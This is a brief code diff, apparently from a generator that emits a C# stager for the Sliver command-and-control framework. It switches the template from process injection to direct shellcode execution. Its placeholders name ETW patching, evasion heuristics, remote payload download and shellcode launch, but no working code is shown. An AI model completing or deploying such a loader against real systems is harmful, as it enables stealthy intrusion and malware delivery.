@@ -27,7 +27,7 @@ namespace SliverStager
 {{
     public class Stager
     {{
-        {ak.START_PROCESS_INJECT_IMPORT}
+        {ak.START_SHELLCODE_IMPORT}
         {ak.HEURISTICS_IMPORT}
         {ak.ARCH_DETECTION}
         {ak.ETW_FUNCS}
@@ -36,7 +36,7 @@ namespace SliverStager
             {ak.HEURISTICS_CODE}
             {ak.ETW_PATCH}
             {URL_DL_CODE}
-            {ak.START_PROCESS_INJECT}
+            {ak.START_SHELLCODE}
         }}
 
     }}
